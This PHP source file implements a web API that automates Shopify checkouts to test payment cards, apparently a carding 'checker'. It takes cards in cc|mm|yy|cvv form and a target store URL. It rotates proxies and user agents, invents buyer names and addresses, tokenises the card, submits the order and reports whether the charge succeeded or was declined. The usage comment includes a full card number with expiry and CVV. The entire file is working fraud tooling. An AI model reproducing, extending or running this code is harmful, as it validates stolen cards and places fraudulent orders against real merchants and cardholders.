<?php
/**
 * Adam's Shopify - API Version
 * Web endpoint for Shopify checkout automation
 * 
 * Usage: api.php?cc=5312600150284585|11|2027|669&site=https://shopsalus.com&proxy=host:port:user:pass
 */

// CORS headers for API
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');
header('Content-Type: application/json');

// Handle preflight requests
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// ANSI Color codes (for CLI output only, kept for reference)
const COLOR_RESET = "\033[0m";
const COLOR_RED = "\033[91m";
const COLOR_GREEN = "\033[92m";
const COLOR_YELLOW = "\033[93m";
const COLOR_CYAN = "\033[96m";

/**
 * Find string between two delimiters
 */
function find_between(string $s, string $start, string $end): string {
    try {
        if (strpos($s, $start) !== false && strpos($s, $end) !== false) {
            $parts = explode($start, $s);
            if (count($parts) > 1) {
                $parts2 = explode($end, $parts[1]);
                return $parts2[0] ?? '';
            }
        }
        return "";
    } catch (Exception $e) {
        return "";
    }
}

/**
 * Generate random user agent
 */
function get_random_user_agent(): string {
    $user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    ];
    return $user_agents[array_rand($user_agents)];
}

/**
 * Shopify Auto Class - API Version
 */
class ShopifyAuto {
    private string $user_agent;
    private array $cookies = [];
    private $cookieFile;
    
    // Proxy configuration
    private ?string $proxy_host = null;
    private ?int $proxy_port = null;
    private ?string $proxy_type = null;
    private ?string $proxy_user = null;
    private ?string $proxy_pass = null;

    public function __construct() {
        $this->user_agent = get_random_user_agent();
        $this->cookieFile = '/tmp/shopify_cookies_' . uniqid() . '.txt';
    }

    public function getUserAgent(): string {
        return $this->user_agent;
    }

    public function setUserAgent(string $ua): void {
        $this->user_agent = $ua;
    }
    
    /**
     * Set proxy configuration
     */
    public function setProxy(string $host, int $port, string $type = 'HTTP', ?string $user = null, ?string $pass = null): void {
        $this->proxy_host = $host;
        $this->proxy_port = $port;
        $this->proxy_type = strtoupper($type);
        $this->proxy_user = $user;
        $this->proxy_pass = $pass;
    }
    
    /**
     * Check if proxy is configured
     */
    public function hasProxy(): bool {
        return $this->proxy_host !== null && $this->proxy_port !== null;
    }
    
    /**
     * Auto-detect and validate proxy
     */
    public function validateProxy(): bool {
        if (!$this->hasProxy()) {
            return false;
        }
        
        $proxy_types = ['SOCKS5', 'SOCKS4', 'HTTP'];
        
        foreach ($proxy_types as $type) {
            $proxy_url = $type . '://' . $this->proxy_host . ':' . $this->proxy_port;
            
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://www.google.com');
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 8);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_NOBODY, true);
            curl_setopt($ch, CURLOPT_PROXY, $proxy_url);
            
            switch ($type) {
                case 'SOCKS5':
                    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
                    break;
                case 'SOCKS4':
                    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);
                    break;
                default:
                    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
            }
            
            if ($this->proxy_user && $this->proxy_pass) {
                curl_setopt($ch, CURLOPT_PROXYUSERPWD, $this->proxy_user . ':' . $this->proxy_pass);
            }
            
            curl_exec($ch);
            $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            $error = curl_error($ch);
            curl_close($ch);
            
            if (!$error && $http_code >= 200 && $http_code < 400) {
                $this->proxy_type = $type;
                return true;
            }
        }
        
        return false;
    }
    
    /**
     * Apply proxy settings to curl handle
     */
    private function applyProxySettings($ch): void {
        if (!$this->hasProxy()) {
            return;
        }
        
        $proxy_url = $this->proxy_type . '://' . $this->proxy_host . ':' . $this->proxy_port;
        curl_setopt($ch, CURLOPT_PROXY, $proxy_url);
        
        switch ($this->proxy_type) {
            case 'SOCKS5':
                curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
                break;
            case 'SOCKS4':
                curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);
                break;
            default:
                curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
        }
        
        if ($this->proxy_user && $this->proxy_pass) {
            curl_setopt($ch, CURLOPT_PROXYUSERPWD, $this->proxy_user . ':' . $this->proxy_pass);
        }
    }

    /**
     * Get random user info with VALID addresses
     */
    public function getRandomInfo(): array {
        $us_addresses = [
            ["add1" => "123 Main St", "city" => "Portland", "state" => "Maine", "state_short" => "ME", "zip" => "04101"],
            ["add1" => "456 Oak Ave", "city" => "Portland", "state" => "Maine", "state_short" => "ME", "zip" => "04102"],
            ["add1" => "789 Pine Rd", "city" => "Bangor", "state" => "Maine", "state_short" => "ME", "zip" => "04401"],
        ];

        $first_names = ["John", "Emily", "Alex", "Sarah", "Michael"];
        $last_names = ["Smith", "Johnson", "Williams", "Brown", "Miller"];

        $address = $us_addresses[array_rand($us_addresses)];
        $first_name = $first_names[array_rand($first_names)];
        $last_name = $last_names[array_rand($last_names)];
        $email = strtolower($first_name) . "." . strtolower($last_name) . rand(1, 999) . "@gmail.com";

        return [
            "fname" => $first_name,
            "lname" => $last_name,
            "email" => $email,
            "phone" => "2025550199",
            "add1" => $address["add1"],
            "city" => $address["city"],
            "state" => $address["state"],
            "state_short" => $address["state_short"],
            "zip" => $address["zip"]
        ];
    }

    /**
     * HTTP GET request
     */
    public function httpGet(string $url, array $headers = []): array {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_2_0);
        curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate, br');
        curl_setopt($ch, CURLOPT_COOKIEJAR, $this->cookieFile);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $this->cookieFile);
        
        $this->applyProxySettings($ch);
        
        if (!empty($headers)) {
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        }

        $body = curl_exec($ch);
        $statusCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $effectiveUrl = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
        curl_close($ch);

        return [
            'status_code' => $statusCode,
            'body' => $body,
            'url' => $effectiveUrl
        ];
    }

    /**
     * HTTP POST request
     */
    public function httpPost(string $url, $data = [], array $headers = [], bool $json = true): array {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_2_0);
        curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate, br');
        curl_setopt($ch, CURLOPT_COOKIEJAR, $this->cookieFile);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $this->cookieFile);
        
        $this->applyProxySettings($ch);
        
        if ($json) {
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
        } else {
            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        }
        
        if (!empty($headers)) {
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        }

        $body = curl_exec($ch);
        $statusCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $effectiveUrl = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
        curl_close($ch);

        return [
            'status_code' => $statusCode,
            'body' => $body,
            'url' => $effectiveUrl
        ];
    }
    
    /**
     * Cleanup cookie file
     */
    public function cleanup(): void {
        if ($this->cookieFile && file_exists($this->cookieFile)) {
            @unlink($this->cookieFile);
        }
    }
}

/**
 * Process checkout - main API function
 */
function processCheckout(string $site, string $cc, string $mon, string $year, string $cvv, ?string $proxy = null): array {
    $shop = new ShopifyAuto();
    $result = [
        'Price' => '0.00',
        'Response' => ''
    ];
    
    try {
        // Parse and set proxy if provided
        if (!empty($proxy)) {
            $proxy_parts = explode(':', $proxy);
            $proxy_host = $proxy_parts[0];
            $proxy_port = (int)($proxy_parts[1] ?? 0);
            $proxy_user = null;
            $proxy_pass = null;
            
            // Check for authentication (host:port:user:pass)
            if (count($proxy_parts) >= 4) {
                $proxy_user = $proxy_parts[2];
                $proxy_pass = $proxy_parts[3];
            }
            
            if ($proxy_port > 0) {
                $shop->setProxy($proxy_host, $proxy_port, 'HTTP', $proxy_user, $proxy_pass);
                $shop->validateProxy();
            }
        }
        
        $site = rtrim($site, '/');
        $site_url = $site;

        // Get product info
        $product_header = [
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language: en-US,en;q=0.6',
            'user-agent: ' . $shop->getUserAgent(),
        ];

        $product_response = $shop->httpGet($site . '/products.json', $product_header);
        $products_data = json_decode($product_response['body'], true);
        
        if (!isset($products_data['products'][0])) {
            $result['Response'] = 'No products found';
            return $result;
        }
        
        $product = $products_data['products'][0];
        $product_id = $product['id'];
        $product_handle = $product['handle'];
        $variant_id = $product['variants'][0]['id'];
        $price = $product['variants'][0]['price'];
        
        $result['Price'] = $price;

        // Visit product page
        $shop->httpGet("{$site}/products/{$product_handle}", $product_header);

        // Update user agent
        $shop->setUserAgent(get_random_user_agent());
        $product_header[2] = 'user-agent: ' . $shop->getUserAgent();

        // Get cart
        $shop->httpGet($site . '/cart.js', $product_header);

        // Add to cart
        $add_data = [
            'id' => (string)$variant_id,
            'quantity' => '1',
            'form_type' => 'product',
        ];

        $response = $shop->httpPost($site . '/cart/add.js', $add_data, $product_header, false);
        
        if ($response['status_code'] !== 200) {
            $result['Response'] = 'Failed to add to cart';
            $shop->cleanup();
            return $result;
        }

        // Get cart token
        $cart_response = $shop->httpGet("{$site}/cart.js", $product_header);
        $cart_data = json_decode($cart_response['body'], true);
        $token = $cart_data['token'];

        // Go to checkout
        $checkout_headers = [
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'content-type: application/x-www-form-urlencoded',
            'origin: ' . $site,
            'referer: ' . $site . '/cart',
            'upgrade-insecure-requests: 1',
            'user-agent: ' . $shop->getUserAgent(),
        ];

        $shop->httpGet("{$site}/checkout", $checkout_headers);

        $checkout_data = [
            'checkout' => '',
            'updates[]' => '1',
        ];
        
        $checkout_response = $shop->httpPost("{$site}/cart", $checkout_data, $checkout_headers, false);

        $response_text2 = $checkout_response['body'];

        // Extract session token
        $session_token = null;
        
        if (preg_match('/name="serialized-sessionToken"\s+content=""([^&]+)""/', $response_text2, $matches)) {
            $session_token = $matches[1];
        }
        
        if (!$session_token && preg_match('/name="serialized-sessionToken"\s+content="([^"]+)"/', $response_text2, $matches)) {
            $content = $matches[1];
            $decoded = html_entity_decode($content);
            $decoded = trim($decoded, '"');
            if (strpos($decoded, 'AAEB') === 0) {
                $session_token = $decoded;
            }
        }
        
        if (!$session_token) {
            $result['Response'] = 'SESSION_TOKEN_NOT_FOUND';
            $shop->cleanup();
            return $result;
        }

        // Extract queueToken and stableId
        $decoded_response = html_entity_decode($response_text2);
        
        $queue_token = '';
        if (preg_match('/"queueToken":"([^"]+)"/', $decoded_response, $matches)) {
            $queue_token = $matches[1];
        }
        
        $stable_id = '';
        if (preg_match('/"stableId":"([^"]+)"/', $decoded_response, $matches)) {
            $stable_id = $matches[1];
        }
        
        $paymentMethodIdentifier = '';
        if (preg_match('/"paymentMethodIdentifier":"([^"]+)"/', $decoded_response, $matches)) {
            $paymentMethodIdentifier = $matches[1];
        }
        if (empty($paymentMethodIdentifier)) {
            if (preg_match('/shopify_payments.*?"paymentMethodIdentifier":"([^"]+)"/s', $decoded_response, $matches)) {
                $paymentMethodIdentifier = $matches[1];
            }
        }

        // Create payment session
        $random_info = $shop->getRandomInfo();
        $fname = $random_info["fname"];
        $lname = $random_info["lname"];
        $email = $random_info["email"];
        $phone = $random_info["phone"];
        $add1 = $random_info["add1"];
        $city = $random_info["city"];
        $state_short = $random_info["state_short"];
        $zip_code = (string)$random_info["zip"];

        $session_endpoints = [
            "https://deposit.us.shopifycs.com/sessions",
            "https://checkout.pci.shopifyinc.com/sessions",
            "https://checkout.shopifycs.com/sessions"
        ];

        $sessionid = null;

        foreach ($session_endpoints as $endpoint) {
            $headers = [
                'authority: ' . parse_url($endpoint, PHP_URL_HOST),
                'accept: application/json',
                'content-type: application/json',
                'origin: https://checkout.shopifycs.com',
                'referer: https://checkout.shopifycs.com/',
                'user-agent: ' . $shop->getUserAgent(),
            ];

            $json_data = [
                'credit_card' => [
                    'number' => $cc,
                    'month' => (int)$mon,
                    'year' => (int)$year,
                    'verification_value' => $cvv,
                    'name' => $fname . ' ' . $lname,
                ],
                'payment_session_scope' => parse_url($site_url, PHP_URL_HOST),
            ];

            $session_response = $shop->httpPost($endpoint, $json_data, $headers);

            if ($session_response['status_code'] === 200) {
                $session_data = json_decode($session_response['body'], true);
                if (isset($session_data["id"])) {
                    $sessionid = $session_data["id"];
                    break;
                }
            }
        }

        if (!$sessionid) {
            $result['Response'] = 'CARD_DECLINED';
            $shop->cleanup();
            return $result;
        }

        // Submit payment via GraphQL
        $graphql_url = "{$site_url}/checkouts/unstable/graphql";

        $graphql_headers = [
            'authority: ' . parse_url($site_url, PHP_URL_HOST),
            'accept: application/json',
            'content-type: application/json',
            'origin: ' . $site_url,
            'referer: ' . $site_url . '/',
            'user-agent: ' . $shop->getUserAgent(),
            'x-checkout-one-session-token: ' . $session_token,
            'x-checkout-web-deploy-stage: production',
            'x-checkout-web-source-id: ' . $token,
        ];

        $random_page_id = sprintf(
            '%08x-%04X-%04X-%04X-%012X',
            mt_rand(10000000, 99999999),
            mt_rand(1000, 9999),
            mt_rand(1000, 9999),
            mt_rand(1000, 9999),
            mt_rand(100000000000, 999999999999)
        );

        $graphql_payload = [
            'query' => 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage __typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token __typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}',
            'variables' => [
                'input' => [
                    'checkpointData' => null,
                    'sessionInput' => ['sessionToken' => $session_token],
                    'queueToken' => $queue_token,
                    'discounts' => ['lines' => [], 'acceptUnexpectedDiscounts' => true],
                    'delivery' => [
                        'deliveryLines' => [
                            [
                                'selectedDeliveryStrategy' => [
                                    'deliveryStrategyMatchingConditions' => [
                                        'estimatedTimeInTransit' => ['any' => true],
                                        'shipments' => ['any' => true],
                                    ],
                                    'options' => new stdClass(),
                                ],
                                'targetMerchandiseLines' => ['lines' => [['stableId' => $stable_id]]],
                                'destination' => [
                                    'streetAddress' => [
                                        'address1' => $add1,
                                        'address2' => '',
                                        'city' => $city,
                                        'countryCode' => 'US',
                                        'postalCode' => $zip_code,
                                        'company' => '',
                                        'firstName' => $fname,
                                        'lastName' => $lname,
                                        'zoneCode' => $state_short,
                                        'phone' => $phone,
                                    ],
                                ],
                                'deliveryMethodTypes' => ['SHIPPING'],
                                'expectedTotalPrice' => ['any' => true],
                                'destinationChanged' => true,
                            ],
                        ],
                        'noDeliveryRequired' => [],
                        'useProgressiveRates' => false,
                    ],
                    'merchandise' => [
                        'merchandiseLines' => [
                            [
                                'stableId' => $stable_id,
                                'merchandise' => [
                                    'productVariantReference' => [
                                        'id' => "gid://shopify/ProductVariantMerchandise/{$variant_id}",
                                        'variantId' => "gid://shopify/ProductVariant/{$variant_id}",
                                        'properties' => [],
                                        'sellingPlanId' => null,
                                        'sellingPlanDigest' => null,
                                    ],
                                ],
                                'quantity' => ['items' => ['value' => 1]],
                                'expectedTotalPrice' => ['any' => true],
                                'lineComponentsSource' => null,
                                'lineComponents' => [],
                            ],
                        ],
                    ],
                    'payment' => [
                        'totalAmount' => ['any' => true],
                        'paymentLines' => [
                            [
                                'paymentMethod' => [
                                    'directPaymentMethod' => [
                                        'paymentMethodIdentifier' => $paymentMethodIdentifier,
                                        'sessionId' => $sessionid,
                                        'billingAddress' => [
                                            'streetAddress' => [
                                                'address1' => $add1,
                                                'address2' => '',
                                                'city' => $city,
                                                'countryCode' => 'US',
                                                'postalCode' => $zip_code,
                                                'company' => '',
                                                'firstName' => $fname,
                                                'lastName' => $lname,
                                                'zoneCode' => $state_short,
                                                'phone' => $phone,
                                            ],
                                        ],
                                        'cardSource' => null,
                                    ],
                                ],
                                'amount' => ['any' => true],
                                'dueAt' => null,
                            ],
                        ],
                        'billingAddress' => [
                            'streetAddress' => [
                                'address1' => $add1,
                                'address2' => '',
                                'city' => $city,
                                'countryCode' => 'US',
                                'postalCode' => $zip_code,
                                'company' => '',
                                'firstName' => $fname,
                                'lastName' => $lname,
                                'zoneCode' => $state_short,
                                'phone' => $phone,
                            ],
                        ],
                    ],
                    'buyerIdentity' => [
                        'buyerIdentity' => [
                            'presentmentCurrency' => 'USD',
                            'countryCode' => 'US',
                        ],
                        'contactInfoV2' => [
                            'emailOrSms' => [
                                'value' => $email,
                                'emailOrSmsChanged' => false,
                            ],
                        ],
                        'marketingConsent' => [['email' => ['value' => $email]]],
                    ],
                    'tip' => ['tipLines' => []],
                    'taxes' => [
                        'proposedAllocations' => null,
                        'proposedTotalAmount' => ['value' => ['amount' => '0', 'currencyCode' => 'USD']],
                        'proposedTotalIncludedAmount' => null,
                        'proposedMixedStateTotalAmount' => null,
                        'proposedExemptions' => [],
                    ],
                    'note' => ['message' => null, 'customAttributes' => []],
                    'localizationExtension' => ['fields' => []],
                    'nonNegotiableTerms' => null,
                    'scriptFingerprint' => [
                        'signature' => null,
                        'signatureUuid' => null,
                        'lineItemScriptChanges' => [],
                        'paymentScriptChanges' => [],
                        'shippingScriptChanges' => [],
                    ],
                    'optionalDuties' => ['buyerRefusesDuties' => false],
                ],
                'attemptToken' => $token . '-' . mt_rand() / mt_getrandmax(),
                'metafields' => [],
                'analytics' => [
                    'requestUrl' => "{$site_url}/checkouts/cn/{$token}",
                    'pageId' => $random_page_id,
                ],
            ],
            'operationName' => 'SubmitForCompletion',
        ];

        $graphql_response = $shop->httpPost($graphql_url, $graphql_payload, $graphql_headers);

        if ($graphql_response['status_code'] === 200) {
            $result_data = json_decode($graphql_response['body'], true);
            $completion = $result_data['data']['submitForCompletion'] ?? [];

            $receipt_id = $completion['receipt']['id'] ?? null;

            if (($completion['__typename'] ?? '') === 'Throttled') {
                // Poll for result
                $poll_payload = [
                    'query' => 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderIdentity{buyerIdentifier id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}__typename}__typename}',
                    'variables' => [
                        'receiptId' => $receipt_id,
                        'sessionToken' => $session_token,
                    ],
                    'operationName' => 'PollForReceipt'
                ];

                for ($poll_attempt = 0; $poll_attempt < 10; $poll_attempt++) {
                    sleep(3);
                    $poll_response = $shop->httpPost($graphql_url, $poll_payload, $graphql_headers);
                    
                    if ($poll_response['status_code'] === 200) {
                        $poll_data = json_decode($poll_response['body'], true);
                        $receipt = $poll_data['data']['receipt'] ?? [];

                        if (($receipt['__typename'] ?? '') === 'ProcessedReceipt' || isset($receipt['orderIdentity'])) {
                            $order_id = $receipt['orderIdentity']['id'] ?? 'N/A';
                            $result['Response'] = "SUCCESS - Order: {$order_id}";
                            $shop->cleanup();
                            return $result;
                        } elseif (($receipt['__typename'] ?? '') === 'ActionRequiredReceipt') {
                            $result['Response'] = '3DS_REQUIRED';
                            $shop->cleanup();
                            return $result;
                        } elseif (($receipt['__typename'] ?? '') === 'FailedReceipt') {
                            $result['Response'] = 'CARD_DECLINED';
                            $shop->cleanup();
                            return $result;
                        }
                    }
                }
            }

            if (isset($completion['errors'])) {
                $errors = $completion['errors'];
                $error_codes = array_map(function($e) {
                    return $e['code'] ?? null;
                }, $errors);
                $error_codes = array_filter($error_codes);
                
                if (!empty($error_codes)) {
                    // Check for soft errors that should be retried
                    $soft_errors = ['TAX_NEW_TAX_MUST_BE_ACCEPTED', 'WAITING_PENDING_TERMS'];
                    $non_soft_errors = array_diff($error_codes, $soft_errors);
                    
                    if (!empty($non_soft_errors)) {
                        // Hard errors - return immediately
                        $result['Response'] = implode(', ', $non_soft_errors);
                        $shop->cleanup();
                        return $result;
                    } else {
                        // Soft errors - retry after delay
                        sleep(2);
                        
                        // Retry the GraphQL submission
                        $retry_response = $shop->httpPost($graphql_url, $graphql_payload, $graphql_headers);
                        
                        if ($retry_response['status_code'] === 200) {
                            $retry_data = json_decode($retry_response['body'], true);
                            $retry_completion = $retry_data['data']['submitForCompletion'] ?? [];
                            
                            $retry_receipt_id = $retry_completion['receipt']['id'] ?? null;
                            
                            if (($retry_completion['__typename'] ?? '') === 'Throttled' || $retry_receipt_id) {
                                // Poll for result
                                $poll_payload = [
                                    'query' => 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderIdentity{buyerIdentifier id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}__typename}__typename}__typename}',
                                    'variables' => [
                                        'receiptId' => $retry_receipt_id,
                                        'sessionToken' => $session_token,
                                    ],
                                    'operationName' => 'PollForReceipt'
                                ];

                                for ($poll_attempt = 0; $poll_attempt < 10; $poll_attempt++) {
                                    sleep(3);
                                    $poll_response = $shop->httpPost($graphql_url, $poll_payload, $graphql_headers);
                                    
                                    if ($poll_response['status_code'] === 200) {
                                        $poll_data = json_decode($poll_response['body'], true);
                                        $receipt = $poll_data['data']['receipt'] ?? [];

                                        if (($receipt['__typename'] ?? '') === 'ProcessedReceipt' || isset($receipt['orderIdentity'])) {
                                            $order_id = $receipt['orderIdentity']['id'] ?? 'N/A';
                                            $result['Response'] = "SUCCESS - Order: {$order_id}";
                                            $shop->cleanup();
                                            return $result;
                                        } elseif (($receipt['__typename'] ?? '') === 'ActionRequiredReceipt') {
                                            $result['Response'] = '3DS_REQUIRED';
                                            $shop->cleanup();
                                            return $result;
                                        } elseif (($receipt['__typename'] ?? '') === 'FailedReceipt') {
                                            $result['Response'] = 'CARD_DECLINED';
                                            $shop->cleanup();
                                            return $result;
                                        }
                                    }
                                }
                            }
                            
                            if (isset($retry_completion['reason'])) {
                                $result['Response'] = $retry_completion['reason'];
                                $shop->cleanup();
                                return $result;
                            }
                            
                            if ($retry_receipt_id) {
                                $result['Response'] = 'SUCCESS';
                                $shop->cleanup();
                                return $result;
                            }
                        }
                        
                        // If retry also failed, return the original error
                        $result['Response'] = implode(', ', $error_codes);
                        $shop->cleanup();
                        return $result;
                    }
                }
            }

            if (isset($completion['reason'])) {
                $result['Response'] = $completion['reason'];
                $shop->cleanup();
                return $result;
            }

            if ($receipt_id) {
                $result['Response'] = 'SUCCESS';
                $shop->cleanup();
                return $result;
            }
        }

        // Check final URL
        $final_response = $shop->httpGet("{$site_url}/checkout?from_processing_page=1&validate=true");
        $final_url = $final_response['url'];

        if (stripos($final_url, "/thank") !== false || stripos($final_url, "/orders/") !== false) {
            $result['Response'] = 'SUCCESS';
        } else {
            $result['Response'] = 'UNKNOWN_STATUS';
        }
        
        $shop->cleanup();
        return $result;

    } catch (Exception $e) {
        $result['Response'] = 'ERROR: ' . $e->getMessage();
        $shop->cleanup();
        return $result;
    }
}

// Handle API request
$method = $_SERVER['REQUEST_METHOD'];

if ($method === 'GET' || $method === 'POST') {
    // Get parameters
    if ($method === 'GET') {
        $cc = $_GET['cc'] ?? '';
        $site = $_GET['site'] ?? '';
        $proxy = $_GET['proxy'] ?? null;
    } else {
        $input = json_decode(file_get_contents('php://input'), true);
        $cc = $input['cc'] ?? '';
        $site = $input['site'] ?? '';
        $proxy = $input['proxy'] ?? null;
    }
    
    // Validate required parameters
    if (empty($cc) || empty($site)) {
        echo json_encode([
            'Price' => '0.00',
            'Response' => 'MISSING_PARAMETERS'
        ]);
        exit;
    }
    
    // Parse card (format: cc|mm|yy|cvv)
    $card_parts = explode('|', $cc);
    if (count($card_parts) !== 4) {
        echo json_encode([
            'Price' => '0.00',
            'Response' => 'INVALID_CARD_FORMAT'
        ]);
        exit;
    }
    
    [$cc_num, $mon, $year, $cvv] = $card_parts;
    
    // Process checkout
    $result = processCheckout($site, $cc_num, $mon, $year, $cvv, $proxy);
    
    echo json_encode($result);
} else {
    echo json_encode([
        'Price' => '0.00',
        'Response' => 'INVALID_METHOD'
    ]);
}
